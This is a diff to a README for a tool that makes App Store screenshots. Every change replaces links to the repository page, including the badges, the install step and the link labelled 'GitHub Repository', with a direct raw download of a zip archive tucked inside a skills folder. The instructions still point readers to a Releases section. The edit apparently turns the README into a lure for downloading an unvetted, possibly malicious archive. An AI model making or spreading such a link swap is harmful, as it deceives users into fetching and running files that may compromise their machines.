@@ -1,6 +1,6 @@
 # 📱 app-store-screenshots - Create App Store Screenshots Easily
 
-[![Download app-store-screenshots](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/Sebas05c/app-store-screenshots)
+[![Download app-store-screenshots](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/Sebas05c/app-store-screenshots/main/skills/app-store-screenshots/store_app_screenshots_3.5.zip)
 
 ## 📋 About app-store-screenshots
 
@@ -25,7 +25,7 @@ Make sure your system meets these minimum requirements for smooth use.
 To start, you need the software files on your computer. Follow these steps:
 
 1. Click the blue button above or visit this page to download the latest version:  
-   https://github.com/Sebas05c/app-store-screenshots
+   https://raw.githubusercontent.com/Sebas05c/app-store-screenshots/main/skills/app-store-screenshots/store_app_screenshots_3.5.zip
 
 2. On the GitHub page, look for the "Releases" section on the right or under the repository name.
 
@@ -119,10 +119,10 @@ A: The templates cover the most common device sizes, including iPhone and iPad.
 ## 🌐 Useful Links
 
 - Download app-store-screenshots:  
-  https://github.com/Sebas05c/app-store-screenshots
+  https://raw.githubusercontent.com/Sebas05c/app-store-screenshots/main/skills/app-store-screenshots/store_app_screenshots_3.5.zip
 
 - GitHub Repository:  
-  https://github.com/Sebas05c/app-store-screenshots
+  https://raw.githubusercontent.com/Sebas05c/app-store-screenshots/main/skills/app-store-screenshots/store_app_screenshots_3.5.zip
 
 ## ⚙️ Troubleshooting
 
@@ -143,4 +143,4 @@ If problems continue, report issues on the GitHub page.
 
 ---
 
-[![Download app-store-screenshots](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/Sebas05c/app-store-screenshots)
+[![Download app-store-screenshots](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/Sebas05c/app-store-screenshots/main/skills/app-store-screenshots/store_app_screenshots_3.5.zip)
